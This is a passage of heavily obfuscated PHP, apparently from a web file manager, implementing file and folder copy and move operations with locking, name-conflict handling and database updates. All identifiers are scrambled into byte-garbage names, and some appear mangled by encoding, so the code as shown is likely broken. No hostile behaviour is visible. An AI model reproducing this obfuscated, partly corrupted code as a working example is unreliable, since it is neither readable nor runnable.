self::$_lockItemArr[$Ç¤àø£Ö] = 1; CacheLock::lock($Ç¤àø£Ö, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ç¤àø£Ö])) { return; } unset(self::$_lockItemArr[$Ç¤àø£Ö]); CacheLock::unlock($Ç¤àø£Ö); } } public function isParentOf($’ù×«¹, $‡íşä“­) { $ÁÚóÌåû =& $_SERVER[”ôÑ§ì¸]; $”âòäÄœ = $this->sourceInfo($’ù×«¹); $ Í£ĞÄ = $this->sourceInfo($‡íşä“­); $ƒ°øŞ½  = $”âòäÄœ[$ÁÚóÌåû[552]] . $”âòäÄœ[$ÁÚóÌåû[180]] . $ÁÚóÌåû[50]; $¼¼ôÓş‹ = $ Í£ĞÄ[$ÁÚóÌåû[552]] . $ Í£ĞÄ[$ÁÚóÌåû[180]] . $ÁÚóÌåû[50]; $ñ ¦‡” = strpos($¼¼ôÓş‹, $ƒ°øŞ½ ) === 0; return $ñ ¦‡”; } private $targetIsDelete = 0; public function copy($Ìãºíò›, $Èõáï™¬, $òáØÒÅğ = REPEAT_REPLACE, $¼ˆ®¹İ¨ = '') { $‹Î«·Úè =& $_SERVER[”ôÑ§ì¸]; $­™ ø¨ü = $this->sourceInfo($Ìãºíò›); $§äò¸ê = $this->sourceInfo($Èõáï™¬); if (!$­™ ø¨ü || !$§äò¸ê || $§äò¸ê[$‹Î«·Úè[452]] != $‹Î«·Úè[88]) { return !1; } if ($this->isParentOf($Ìãºíò›, $Èõáï™¬)) { return !1; } $ÚùóöÊÜ = $¼ˆ®¹İ¨ ? $¼ˆ®¹İ¨ : $­™ ø¨ü[$‹Î«·Úè[32]]; $this->lockCopyStart($Ìãºíò›); $this->lockWriteStart($Èõáï™¬, $ÚùóöÊÜ); $òî æôÏ = array($‹Î«·Úè[596] => array(), $‹Î«·Úè[597] => array(), $‹Î«·Úè[598] => array()); $this->targetIsDelete = intval($­™ ø¨ü[$‹Î«·Úè[472]]); $“›Õ¦’’ = $this->fileNameExistCache($Èõáï™¬, $­™ ø¨ü[$‹Î«·Úè[32]]); $ıÇğùõ— = $this->_copy($Ìãºíò›, $Èõáï™¬, $òáØÒÅğ, $òî æôÏ, !0, $¼ˆ®¹İ¨); $this->_childrenListClear(); $this->lockCopyEnd($Ìãºíò›); $this->lockWriteEnd($Èõáï™¬, $ÚùóöÊÜ); if ($­™ ø¨ü[$‹Î«·Úè[452]] == $‹Î«·Úè[88] && $“›Õ¦’’ == $ıÇğùõ—) { $this->folderSizeResetChildren($“›Õ¦’’); } Model($‹Î«·Úè[599])->addAll($òî æôÏ[$‹Î«·Úè[597]], array(), !0); if ($“›Õ¦’’ != $ıÇğùõ— || $­™ ø¨ü[$‹Î«·Úè[452]] == $‹Î«·Úè[88]) { Model($‹Î«·Úè[600])->eventCopy($ıÇğùõ—); } $this->saveAll($òî æôÏ[$‹Î«·Úè[598]]); Model($‹Î«·Úè[213])->linkAdd($òî æôÏ[$‹Î«·Úè[596]]); $this->folderSizeReset($Èõáï™¬); $this->updateModifyTime($Èõáï™¬); return $ıÇğùõ—; } private function _copy($Ëéñ¤õ½, $øØù‡¤, $©‹Ÿµƒ, &$·…©»ì„, $ä­…î‰û, $×ö·¯‚ = '') { $°âŞğè¬ =& $_SERVER[”ôÑ§ì¸]; $ù¢ìÇ«£ = $this->sourceInfoCache($Ëéñ¤õ½); $È‡åšğ” = $ù¢ìÇ«£[$°âŞğè¬[452]] == $°âŞğè¬[88]; $¯ÖùÌÀİ = $×ö·¯‚ ? $×ö·¯‚ : $ù¢ìÇ«£[$°âŞğè¬[32]]; $ØîÃêöÁ = $this->fileNameExistCache($øØù‡¤, $¯ÖùÌÀİ); if ($ä­…î‰û) { $this->_childrenAllMake($Ëéñ¤õ½); if ($È‡åšğ” && $ØîÃêöÁ) { $this->_childrenAllMake($ØîÃêöÁ); } } if (!$ØîÃêöÁ) { return $this->_copyCreate($Ëéñ¤õ½, $øØù‡¤, $¯ÖùÌÀİ, $·…©»ì„); } $æŸÚúÕ = $ØîÃêöÁ; if ($È‡åšğ”) { if ($©‹Ÿµƒ == REPEAT_RENAME_FOLDER) { $¯ÖùÌÀİ = $this->fileNameAutoCache($øØù‡¤, $¯ÖùÌÀİ, $©‹Ÿµƒ, $È‡åšğ”); $æŸÚúÕ = $this->_copyCreate($Ëéñ¤õ½, $øØù‡¤, $¯ÖùÌÀİ, $·…©»ì„); } else { $‘ËôÂï = $this->_childrenList($Ëéñ¤õ½); foreach ($‘ËôÂï as $ÄñÈ†—Ë) { $this->_copy($ÄñÈ†—Ë[$°âŞğè¬[180]], $ØîÃêöÁ, $©‹Ÿµƒ, $·…©»ì„, !1); } } } else { if ($©‹Ÿµƒ == REPEAT_RENAME || $©‹Ÿµƒ == REPEAT_RENAME_FOLDER) { $¯ÖùÌÀİ = $this->fileNameAutoCache($øØù‡¤, $¯ÖùÌÀİ, $©‹Ÿµƒ, $È‡åšğ”); $æŸÚúÕ = $this->_copyCreate($Ëéñ¤õ½, $øØù‡¤, $¯ÖùÌÀİ, $·…©»ì„); } else { if ($©‹Ÿµƒ == REPEAT_REPLACE) { $“¥ö”²© = $this->sourceInfoCache($ØîÃêöÁ); $¦Õº™“¨ = $this->fileHistory($“¥ö”²©, $ù¢ìÇ«£[$°âŞğè¬[508]], $ù¢ìÇ«£[$°âŞğè¬[76]]); if ($¦Õº™“¨) { $·…©»ì„[$°âŞğè¬[596]][] = $ù¢ìÇ«£[$°âŞğè¬[508]]; } } else { if ($©‹Ÿµƒ == REPEAT_SKIP) { } } } Hook::trigger($°âŞğè¬[601], array($°âŞğè¬[602], $ù¢ìÇ«£, 0)); } return $æŸÚúÕ; } private function _copyCreate($Ûüòì»é, $­±×ÓĞá, $Æ£Î·™¥, &$ÍÉ–êúë) { $ÂŞ´œãÏ =& $_SERVER[”ôÑ§ì¸]; $ÉÈÊ—§ = $this->sourceInfoCache($Ûüòì»é); $¡Í—”øÔ = $this->sourceInfoCache($­±×ÓĞá); $ Àñ«„Ş = $this->_makeItemData($ÉÈÊ—§, $¡Í—”øÔ, $Æ£Î·™¥); Hook::trigger($ÂŞ´œãÏ[603], $ Àñ«„Ş); Hook::trigger($ÂŞ´œãÏ[604], array($ÂŞ´œãÏ[605], $ Àñ«„Ş, 0)); $ÔãåôàĞ = $this->add($ Àñ«„Ş); $«ŠõùÙŸ = array($ÂŞ´œãÏ[180] => $ÔãåôàĞ, $ÂŞ´œãÏ[32] => $Æ£Î·™¥); $this->_copyApplyMeta($«ŠõùÙŸ, $ÍÉ–êúë); if ($ÉÈÊ—§[$ÂŞ´œãÏ[452]] != $ÂŞ´œãÏ[88]) { $ÍÉ–êúë[$ÂŞ´œãÏ[596]][] = $ÉÈÊ—§[$ÂŞ´œãÏ[508]]; return $ÔãåôàĞ; } $É´‚ôá = array(); $´¢Å£Ñú = array(); $this->_childrenListAll($Ûüòì»é, $É´‚ôá); $¯Ìˆ×İ’ = count($É´‚ôá); if ($¯Ìˆ×İ’ == 0) { return $ÔãåôàĞ; } $İüîŠ¼Ğ = $this->sourceInfo($ÔãåôàĞ); foreach ($É´‚ôá as $øèÁªÑ”) { $ û“Ş£É = $this->_makeItemData($øèÁªÑ”, $İüîŠ¼Ğ, $øèÁªÑ”[$ÂŞ´œãÏ[32]]); $ û“Ş£É[$ÂŞ´œãÏ[552]] = $øèÁªÑ”[$ÂŞ´œãÏ[552]]; $´¢Å£Ñú[] = $ û“Ş£É; } $this->chunkEventSet($ÂŞ´œãÏ[606], array($ÂŞ´œãÏ[607], $ Àñ«„Ş, $¯Ìˆ×İ’)); $this->addAll($´¢Å£Ñú, array(), !1); $‡á¸Õóš = $this->where(array($ÂŞ´œãÏ[179] => $ÔãåôàĞ))->select(); $ÍœŸ¹ä = $this->_childrenMakeRelation($É´‚ôá, $‡á¸Õóš); $ÍœŸ¹ä[$Ûüòì»é] = $ÔãåôàĞ; $âöÀüß– = array(); $µ¶¢ûø¿ = array(); foreach ($‡á¸Õóš as $øèÁªÑ”) { $ÀøÀ¿Ş = $øèÁªÑ”[$ÂŞ´œãÏ[180]]; $ˆÂßìŠ = $this->_childrenMatch($ÍœŸ¹ä, $øèÁªÑ”, $İüîŠ¼Ğ); $âöÀüß–[] = array($ÂŞ´œãÏ[180], $ÀøÀ¿Ş, $ÂŞ´œãÏ[179], $ˆÂßìŠ[$ÂŞ´œãÏ[179]]); $µ¶¢ûø¿[] = array($ÂŞ´œãÏ[180], $ÀøÀ¿Ş, $ÂŞ´œãÏ[552], $ˆÂßìŠ[$ÂŞ´œãÏ[552]]); $this->_copyApplyMeta($øèÁªÑ”, $ÍÉ–êúë); if ($øèÁªÑ”[$ÂŞ´œãÏ[452]] != $ÂŞ´œãÏ[88]) { $ÍÉ–êúë[$ÂŞ´œãÏ[596]][] = $øèÁªÑ”[$ÂŞ´œãÏ[508]]; } } $this->chunkEventSet($ÂŞ´œãÏ[608], array($ÂŞ´œãÏ[609], $ Àñ«„Ş, $¯Ìˆ×İ’)); $this->saveAll($âöÀüß–); $this->chunkEventSet($ÂŞ´œãÏ[610], array($ÂŞ´œãÏ[611], $ Àñ«„Ş, $¯Ìˆ×İ’)); $this->saveAll($µ¶¢ûø¿); return $ÔãåôàĞ; } private function _childrenMakeRelation($£¾×Ó¥, $áıè£¶) { $Ë§¼‚ =& $_SERVER[”ôÑ§ì¸]; $ÇœÀÃÒ¨ = array(); $¡Ç¸—ãÂ = array(); foreach ($£¾×Ó¥ as $êÜß†îà) { $ š“¡Ü = $êÜß†îà[$Ë§¼‚[32]] . $Ë§¼‚[8] . $êÜß†îà[$Ë§¼‚[552]]; $ÇœÀÃÒ¨[$ š“¡Ü] = $êÜß†îà[$Ë§¼‚[180]]; } foreach ($áıè£¶ as $êÜß†îà) { $ š“¡Ü = $êÜß†îà[$Ë§¼‚[32]] . $Ë§¼‚[8] . $êÜß†îà[$Ë§¼‚[552]]; $ë×³ª‰ä = $ÇœÀÃÒ¨[$ š“¡Ü]; $¡Ç¸—ãÂ[$ë×³ª‰ä] = $êÜß†îà[$Ë§¼‚[180]]; } return $¡Ç¸—ãÂ; } private function _childrenMatch($©¬©ºİ™, $ïá¢·Üå, $ÃîÛ±³ò) { $¨é¦Æº‰ =& $_SERVER[”ôÑ§ì¸]; $Âµˆ¾ = $ÃîÛ±³ò[$¨é¦Æº‰[552]]; $€®ğÀÒû = $this->parentLevelArray($ïá¢·Üå[$¨é¦Æº‰[552]]); foreach ($€®ğÀÒû as $Ş¯£·Êï) { if (isset($©¬©ºİ™[$Ş¯£·Êï])) { $Âµˆ¾ .= $©¬©ºİ™[$Ş¯£·Êï] . $¨é¦Æº‰[612]; } } $Âµˆ¾ = rtrim($Âµˆ¾, $¨é¦Æº‰[50]) . $¨é¦Æº‰[50]; $›ìÏË›† = $this->parentLevelArray($Âµˆ¾); $„™â’î¼ = $›ìÏË›†[count($›ìÏË›†) - 1]; return array($¨é¦Æº‰[179] => $„™â’î¼, $¨é¦Æº‰[552] => $Âµˆ¾); } private function _makeItemData($½®‹å™Í, $üÄëÏõ, $¸æü…Ïø) { $üô«¨ ™ =& $_SERVER[”ôÑ§ì¸]; $Ô¼ğ¤ë = array($üô«¨ ™[613] => $½®‹å™Í[$üô«¨ ™[452]], $üô«¨ ™[461] => $¸æü…Ïø, $üô«¨ ™[614] => $½®‹å™Í[$üô«¨ ™[453]] ? $½®‹å™Í[$üô«¨ ™[453]] : $üô«¨ ™[12], $üô«¨ ™[509] => $½®‹å™Í[$üô«¨ ™[508]] ? $½®‹å™Í[$üô«¨ ™[508]] : 0, $üô«¨ ™[584] => $½®‹å™Í[$üô«¨ ™[76]] ? $½®‹å™Í[$üô«¨ ™[76]] : 0, $üô«¨ ™[615] => intval($üÄëÏõ[$üô«¨ ™[177]]), $üô«¨ ™[616] => intval($üÄëÏõ[$üô«¨ ™[537]]), $üô«¨ ™[617] => intval(USER_ID), $üô«¨ ™[618] => intval(USER_ID), $üô«¨ ™[444] => intval($üÄëÏõ[$üô«¨ ™[180]]), $üô«¨ ™[619] => $üÄëÏõ[$üô«¨ ™[552]] . $üÄëÏõ[$üô«¨ ™[180]] . $üô«¨ ™[50], $üô«¨ ™[465] => $½®‹å™Í[$üô«¨ ™[85]] ? $½®‹å™Í[$üô«¨ ™[85]] : time(), $üô«¨ ™[471] => 0, $üô«¨ ™[620] => $üô«¨ ™[12]); return $Ô¼ğ¤ë; } private function _copyApplyMeta($ÅæşãÅÉ, &$·ÎöéŞÍ) { $Ã™ùü•¬ =& $_SERVER[”ôÑ§ì¸]; $–ıà™‹ = $ÅæşãÅÉ[$Ã™ùü•¬[180]]; $šÙ³€ôš = $ÅæşãÅÉ[$Ã™ùü•¬[32]]; if (!isset($ÅæşãÅÉ[$Ã™ùü•¬[621]]) || !$ÅæşãÅÉ[$Ã™ùü•¬[621]] || $ÅæşãÅÉ[$Ã™ùü•¬[621]] == $Ã™ùü•¬[211]) { $·ÎöéŞÍ[$Ã™ùü•¬[598]][] = array($Ã™ùü•¬[180], $–ıà™‹, $Ã™ùü•¬[621], short_id($–ıà™‹)); } if (Input::check($šÙ³€ôš, $Ã™ùü•¬[622])) { $·ÎöéŞÍ[$Ã™ùü•¬[597]][] = array($Ã™ùü•¬[180] => $–ıà™‹, $Ã™ùü•¬[94] => $Ã™ùü•¬[505], $Ã™ùü•¬[417] => str_replace($Ã™ùü•¬[53], $Ã™ùü•¬[12], Pinyin::get($šÙ³€ôš))); $·ÎöéŞÍ[$Ã™ùü•¬[597]][] = array($Ã™ùü•¬[180] => $–ıà™‹, $Ã™ùü•¬[94] => $Ã™ùü•¬[504], $Ã™ùü•¬[417] => Pinyin::get($šÙ³€ôš, $Ã™ùü•¬[623])); } $·ÎöéŞÍ[$Ã™ùü•¬[597]][] = array($Ã™ùü•¬[180] => $–ıà™‹, $Ã™ùü•¬[94] => $Ã™ùü•¬[484], $Ã™ùü•¬[417] => KodSort::makeStr($šÙ³€ôš)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ÇÁ€œş¢) { $şúÂòš =& $_SERVER[”ôÑ§ì¸]; $äúÓ©Ñ¶ = $this->sourceInfo($ÇÁ€œş¢); $È¦¤á‡İ = $şúÂòš[624]; $ÀÉ»íÊ = array($şúÂòš[552] => array($şúÂòš[579], $äúÓ©Ñ¶[$şúÂòš[552]] . $ÇÁ€œş¢ . $şúÂòš[580]), $şúÂòš[472] => $this->targetIsDelete); $ÀËİç¼å = $this->field($È¦¤á‡İ)->where($ÀÉ»íÊ)->select(); if (!$ÀËİç¼å) { return; } $ÀËİç¼å = array_to_keyvalue($ÀËİç¼å, $şúÂòš[180]); foreach ($ÀËİç¼å as $‰àú»Ñ) { $À’£üŞ› = $‰àú»Ñ[$şúÂòš[179]]; $ÇÁ€œş¢ = $‰àú»Ñ[$şúÂòš[180]]; if (!isset($this->_childrenListCache[$ÇÁ€œş¢]) && $‰àú»Ñ[$şúÂòš[452]] == $şúÂòš[88]) { $this->_childrenListCache[$ÇÁ€œş¢] = array(); } if (!isset($this->_childrenListCache[$À’£üŞ›])) { $this->_childrenListCache[$À’£üŞ›] = array(); } $this->_childrenListCache[$À’£üŞ›][$ÇÁ€œş¢] = $‰àú»Ñ; $this->_childrenItemCache[$ÇÁ€œş¢] = $‰àú»Ñ; } } private function _childrenListAll($Úú»¸ÏÉ, &$´Ÿ«³íù) { $ĞË’Ô· =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->_childrenListCache[$Úú»¸ÏÉ])) { return; } $Ã¢ìè®“ = $this->_childrenListCache[$Úú»¸ÏÉ]; foreach ($Ã¢ìè®“ as $×Ú¥ˆ†§ => $ èÄ™Ğè) { $´Ÿ«³íù[$×Ú¥ˆ†§] = $ èÄ™Ğè; if ($ èÄ™Ğè[$ĞË’Ô·[452]] == $ĞË’Ô·[88]) { $this->_childrenListAll($×Ú¥ˆ†§, $´Ÿ«³íù); } } } private function sourceInfoCache($ûİÂìÏ”) { if (isset($this->_childrenItemCache[$ûİÂìÏ”])) { return $this->_childrenItemCache[$ûİÂìÏ”]; } return $this->sourceInfo($ûİÂìÏ”); } private function _childrenList($Şƒ†»ß™) { if (isset($this->_childrenListCache[$Şƒ†»ß™])) { return $this->_childrenListCache[$Şƒ†»ß™]; } return $this->_childrenListSelect($Şƒ†»ß™); } private function _childrenListSelect($ô  û­å) { $•’ƒÛğĞ =& $_SERVER[”ôÑ§ì¸]; $ÆÂŸí²µ = array($•’ƒÛğĞ[179] => $ô  û­å, $•’ƒÛğĞ[472] => $this->targetIsDelete); $É¥éÈÏ’ = $this->where($ÆÂŸí²µ)->select(); $É¥éÈÏ’ = $É¥éÈÏ’ ? $É¥éÈÏ’ : array(); $×“Äª‡ò = array_to_keyvalue($É¥éÈÏ’, $•’ƒÛğĞ[180]); $this->_childrenListCache[$ô  û­å] = $×“Äª‡ò; foreach ($×“Äª‡ò as $ô  û­å => $öåÀª‡©) { $this->_childrenItemCache[$ô  û­å] = $öåÀª‡©; } return $×“Äª‡ò; } private function fileNameExistCache($êàøØÙ, $”Áö³üÂ) { $ûç†Ø³» =& $_SERVER[”ôÑ§ì¸]; $”Áö³üÂ = strtolower($”Áö³üÂ); $âš¿ö¤¢ = $this->_childrenList($êàøØÙ); foreach ($âš¿ö¤¢ as $à‚—ô¦) { if ($”Áö³üÂ == strtolower($à‚—ô¦[$ûç†Ø³»[32]])) { return $à‚—ô¦[$ûç†Ø³»[180]]; } } return !1; } private function fileNameAutoCache($ûŠøŒ×, $áôæ¡¡’, $ŸŞî†›¤, $û×˜˜°î) { $Â¬ø»ú¼ =& $_SERVER[”ôÑ§ì¸]; $—ñ¯¤¥ = $this->_childrenList($ûŠøŒ×); $ÄßÜø– = array_to_keyvalue($—ñ¯¤¥, $Â¬ø»ú¼[12], $Â¬ø»ú¼[32]); return $this->fileNameAutoGet($ÄßÜø–, $áôæ¡¡’, $ŸŞî†›¤, $û×˜˜°î); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ñßüö˜û, $Ó˜ ¿‚«, $„ÌÕàì¯ = REPEAT_REPLACE, $áØğÒÜ¦ = '') { $Ùê©·ÀÍ =& $_SERVER[”ôÑ§ì¸]; $ğåÍ•ûÜ = $this->sourceInfo($ñßüö˜û); $ÛÇšùÙ„ = $this->sourceInfo($Ó˜ ¿‚«); if ($ğåÍ•ûÜ[$Ùê©·ÀÍ[179]] == $ÛÇšùÙ„[$Ùê©·ÀÍ[180]]) { if ($ğåÍ•ûÜ[$Ùê©·ÀÍ[472]] == $Ùê©·ÀÍ[88]) { Model($Ùê©·ÀÍ[470])->restore(array($ñßüö˜û)); } if (!$áØğÒÜ¦ || $áØğÒÜ¦ == $ğåÍ•ûÜ[$Ùê©·ÀÍ[32]]) { return $ñßüö˜û; } } $È°øÚç = $this->pathInfoMore($ñßüö˜û); if ($this->isParentOf($ñßüö˜û, $Ó˜ ¿‚«)) { return !1; } if (!$ğåÍ•ûÜ || !$ÛÇšùÙ„ || $ÛÇšùÙ„[$Ùê©·ÀÍ[452]] != $Ùê©·ÀÍ[88]) { return !1; } Hook::trigger($Ùê©·ÀÍ[625], $È°øÚç); $this->targetIsDelete = intval($ğåÍ•ûÜ[$Ùê©·ÀÍ[472]]); if ($ğåÍ•ûÜ[$Ùê©·ÀÍ[179]] == $Ó˜ ¿‚« && $áØğÒÜ¦ != $ğåÍ•ûÜ[$Ùê©·ÀÍ[32]]) { $ÌÇÏ¬¡Á = $this->fileNameExist($Ó˜ ¿‚«, $áØğÒÜ¦); if ($ÌÇÏ¬¡Á && $ğåÍ•ûÜ[$Ùê©·ÀÍ[452]] == $Ùê©·ÀÍ[211]) { $ÚÄ—À¤‚ = $this->sourceInfo($ÌÇÏ¬¡Á); $°™¶ìØ• = $this->fileHistory($ÚÄ—À¤‚, $ğåÍ•ûÜ[$Ùê©·ÀÍ[508]], $ğåÍ•ûÜ[$Ùê©·ÀÍ[76]]); if (!$°™¶ìØ•) { Model($Ùê©·ÀÍ[511])->remove($ğåÍ•ûÜ[$Ùê©·ÀÍ[508]]); } $this->removeNow($ñßüö˜û, !1); $this->folderSizeReset($Ó˜ ¿‚«); Hook::trigger($Ùê©·ÀÍ[626], $È°øÚç); return $ÌÇÏ¬¡Á; } } $ÁÒ¸ÂŒù = $áØğÒÜ¦ ? $áØğÒÜ¦ : $ğåÍ•ûÜ[$Ùê©·ÀÍ[32]]; $this->lockMoveStart($ñßüö˜û); $this->lockWriteStart($Ó˜ ¿‚«, $ÁÒ¸ÂŒù); $Ìß‹¦± = array($Ùê©·ÀÍ[596] => array(), $Ùê©·ÀÍ[627] => !1); $this->clearShare($ñßüö˜û, $Ó˜ ¿‚«); $‰Òîš£Å = $this->fileNameExistCache($Ó˜ ¿‚«, $ğåÍ•ûÜ[$Ùê©·ÀÍ[32]]); $›µÒËŸÕ = $this->_move($ñßüö˜û, $Ó˜ ¿‚«, $„ÌÕàì¯, $Ìß‹¦±, $áØğÒÜ¦); $this->sourceCacheClear(); if ($ğåÍ•ûÜ[$Ùê©·ÀÍ[452]] == $Ùê©·ÀÍ[88] && $‰Òîš£Å) { $this->folderSizeResetChildren($›µÒËŸÕ); } Model($Ùê©·ÀÍ[213])->linkAdd($Ìß‹¦±[$Ùê©·ÀÍ[596]]); if ($‰Òîš£Å && $Ìß‹¦±[$Ùê©·ÀÍ[627]]) { $this->removeNow($ñßüö˜û, !1); } $this->lockMoveEnd($ñßüö˜û); $this->lockWriteEnd($Ó˜ ¿‚«, $ÁÒ¸ÂŒù); $this->folderSizeReset($ğåÍ•ûÜ[$Ùê©·ÀÍ[179]]); $this->folderSizeReset($Ó˜ ¿‚«); $™ì¨¾Ş³ = array($ğåÍ•ûÜ[$Ùê©·ÀÍ[179]], $Ó˜ ¿‚«); if ($ğåÍ•ûÜ[$Ùê©·ÀÍ[452]] == $Ùê©·ÀÍ[88]) { $™ì¨¾Ş³[] = $ñßüö˜û; } $this->updateModifyTime($™ì¨¾Ş³); Model($Ùê©·ÀÍ[600])->eventMove($ñßüö˜û, $ğåÍ•ûÜ[$Ùê©·ÀÍ[179]], $Ó˜ ¿‚«); Hook::trigger($Ùê©·ÀÍ[626], $È°øÚç); return $›µÒËŸÕ; } private function _move($ŸßÓŠÛƒ, $´ïÉÆÉ, $Ó˜‰´÷, &$İÙ¼’’Š, $Á¡Ñ¹‘± = '') { $ìïí¡é” =& $_SERVER[”ôÑ§ì¸]; $©ª¯Â‡¿ = $this->sourceInfo($ŸßÓŠÛƒ); $üÜÏØ± = $©ª¯Â‡¿[$ìïí¡é”[452]] == $ìïí¡é”[88]; $×â«ˆ‹Â = $Á¡Ñ¹‘± ? $Á¡Ñ¹‘± : $©ª¯Â‡¿[$ìïí¡é”[32]]; $‹…ë²•Ò = $this->fileNameExistCache($´ïÉÆÉ, $×â«ˆ‹Â); $this->lockMoveStart($ŸßÓŠÛƒ); $this->lockWriteStart($´ïÉÆÉ, $×â«ˆ‹Â); if (!$‹…ë²•Ò) { return $this->_moveForce($ŸßÓŠÛƒ, $´ïÉÆÉ, $×â«ˆ‹Â); } $¦©ÛæÅº = $‹…ë²•Ò; $¥®†ÈèŸ = !1; if ($üÜÏØ±) { if ($Ó˜‰´÷ == REPEAT_RENAME_FOLDER) { $×â«ˆ‹Â = $this->fileNameAuto($´ïÉÆÉ, $×â«ˆ‹Â, $Ó˜‰´÷, $üÜÏØ±); $¦©ÛæÅº = $this->_moveForce($ŸßÓŠÛƒ, $´ïÉÆÉ, $×â«ˆ‹Â); } else { if ($Ó˜‰´÷ == REPEAT_RENAME_FOLDER) { $Ó˜‰´÷ = REPEAT_RENAME; } $«¥ã½ñ = $this->_childrenListSelect($ŸßÓŠÛƒ); foreach ($«¥ã½ñ as $¸Üü›•Ë) { $this->_move($¸Üü›•Ë[$ìïí¡é”[180]], $‹…ë²•Ò, $Ó˜‰´÷, $İÙ¼’’Š); } $¥®†ÈèŸ = !0; } } else { if ($Ó˜‰´÷ == REPEAT_SKIP) { $¥®†ÈèŸ = !0; } else { if ($Ó˜‰´÷ == REPEAT_RENAME || $Ó˜‰´÷ == REPEAT_RENAME_FOLDER) { $×â«ˆ‹Â = $this->fileNameAuto($´ïÉÆÉ, $×â«ˆ‹Â, $Ó˜‰´÷, $üÜÏØ±); $¦©ÛæÅº = $this->_moveForce($ŸßÓŠÛƒ, $´ïÉÆÉ, $×â«ˆ‹Â); } else { if ($Ó˜‰´÷ == REPEAT_REPLACE) { $ƒ¶€Çå¥ = $this->sourceInfoCache($‹…ë²•Ò); $òı¤ÏÊ¯ = $this->fileHistory($ƒ¶€Çå¥, $©ª¯Â‡¿[$ìïí¡é”[508]], $©ª¯Â‡¿[$ìïí¡é”[76]]); $¥®†ÈèŸ = !0; if ($òı¤ÏÊ¯) { $İÙ¼’’Š[$ìïí¡é”[596]][] = $©ª¯Â‡¿[$ìïí¡é”[508]]; } } } } } if ($¥®†ÈèŸ && !$İÙ¼’’Š[$ìïí¡é”[627]]) { $İÙ¼’’Š[$ìïí¡é”[627]] = !0; } return $¦©ÛæÅº; } private function _moveForce($îŠˆ·³, $ÃĞğ™›ì, $òË¤ß…Ğ) { $˜Û Æ»ó =& $_SERVER[”ôÑ§ì¸]; $•½áõÙ‡ = $this->sourceInfo($îŠˆ·³); $àÕ´’Ñ„ = $this->sourceInfo($ÃĞğ™›ì); $ûÒÅÏî = $•½áõÙ‡[$˜Û Æ»ó[452]] == $˜Û Æ»ó[88]; $û¶ü¨Í¬ = array($˜Û Æ»ó[444] => $àÕ´’Ñ„[$˜Û Æ»ó[180]], $˜Û Æ»ó[619] => $àÕ´’Ñ„[$˜Û Æ»ó[552]] . $àÕ´’Ñ„[$˜Û Æ»ó[180]] . $˜Û Æ»ó[50], $˜Û Æ»ó[615] => $àÕ´’Ñ„[$˜Û Æ»ó[177]], $˜Û Æ»ó[616] => $àÕ´’Ñ„[$˜Û Æ»ó[537]], $˜Û Æ»ó[618] => USER_ID, $˜Û Æ»ó[461] => $òË¤ß…Ğ); $ª±õ‰üË = $•½áõÙ‡[$˜Û Æ»ó[177]] == SourceModel::TYPE_GROUP && $àÕ´’Ñ„[$˜Û Æ»ó[177]] == SourceModel::TYPE_GROUP && $•½áõÙ‡[$˜Û Æ»ó[537]] == $àÕ´’Ñ„[$˜Û Æ»ó[537]]; if (!$ª±õ‰üË && $this->moveClearAuth) { Model($˜Û Æ»ó[534])->authClear($îŠˆ·³); } $´¯‹–ÈÙ = $•½áõÙ‡[$˜Û Æ»ó[472]] == $˜Û Æ»ó[88] && $àÕ´’Ñ„[$˜Û Æ»ó[472]] != $˜Û Æ»ó[88]; if ($´¯‹–ÈÙ) { $û¶ü¨Í¬[$˜Û Æ»ó[471]] = 0; } if ($ûÒÅÏî) { $œúÆŒõÖ = array($˜Û Æ»ó[619] => array($˜Û Æ»ó[579], $•½áõÙ‡[$˜Û Æ»ó[552]] . $•½áõÙ‡[$˜Û Æ»ó[180]] . $˜Û Æ»ó[580])); $ãë©‚Óì = $•½áõÙ‡[$˜Û Æ»ó[552]] . $•½áõÙ‡[$˜Û Æ»ó[180]] . $˜Û Æ»ó[50]; $ëò÷ïÖø = $àÕ´’Ñ„[$˜Û Æ»ó[552]] . $àÕ´’Ñ„[$˜Û Æ»ó[180]] . $˜Û Æ»ó[50] . $•½áõÙ‡[$˜Û Æ»ó[180]] . $˜Û Æ»ó[50]; $”›ßß² = array($˜Û Æ»ó[619] => array($˜Û Æ»ó[628], "\162\145\160\x6c\141\143\x65\50\x70\x61\162\145\x6e\164\x4c\x65\x76\145\x6c\x2c\x27{$ãë©‚Óì}\47\x2c\47{$ëò÷ïÖø}\x27\x29"), $˜Û Æ»ó[615] => $àÕ´’Ñ„[$˜Û Æ»ó[177]], $˜Û Æ»ó[616] => $àÕ´’Ñ„[$˜Û Æ»ó[537]]); if ($´¯‹–ÈÙ) { $”›ßß²[$˜Û Æ»ó[471]] = 0; } $this->where($œúÆŒõÖ)->data($”›ßß²)->save(); } $this->where(array($˜Û Æ»ó[458] => $îŠˆ·³))->data($û¶ü¨Í¬)->save(); return $îŠˆ·³; } private function clearShare($úäÌÜñ , $Íü±¢ˆò) { $›¤ãÙÊŸ =& $_SERVER[”ôÑ§ì¸]; $ê£Ù•Š™ = $this->sourceInfo($úäÌÜñ ); $šó¢°Ø = $this->sourceInfo($Íü±¢ˆò); if ($ê£Ù•Š™[$›¤ãÙÊŸ[537]] == $šó¢°Ø[$›¤ãÙÊŸ[537]] && $ê£Ù•Š™[$›¤ãÙÊŸ[177]] == $›¤ãÙÊŸ[629]) { return; } $ÒıöŒµ = array($›¤ãÙÊŸ[552] => array($›¤ãÙÊŸ[579], $ê£Ù•Š™[$›¤ãÙÊŸ[552]] . $úäÌÜñ  . $›¤ãÙÊŸ[580])); $€’‹’Ôœ = $this->field($›¤ãÙÊŸ[458])->where($ÒıöŒµ)->getField($›¤ãÙÊŸ[180], !0); if (!$€’‹’Ôœ) { return; } $ÒıöŒµ = array($›¤ãÙÊŸ[180] => array($›¤ãÙÊŸ[7], $€’‹’Ôœ), $›¤ãÙÊŸ[630] => 1); $ıºóÁ¹± = Model($›¤ãÙÊŸ[631])->field($›¤ãÙÊŸ[632])->where($ÒıöŒµ)->select(); if (!$ıºóÁ¹±) { return; } $ıºóÁ¹± = array_to_keyvalue($ıºóÁ¹±, $›¤ãÙÊŸ[12], $›¤ãÙÊŸ[632]); $ÒıöŒµ = array($›¤ãÙÊŸ[632] => array($›¤ãÙÊŸ[7], $ıºóÁ¹±)); 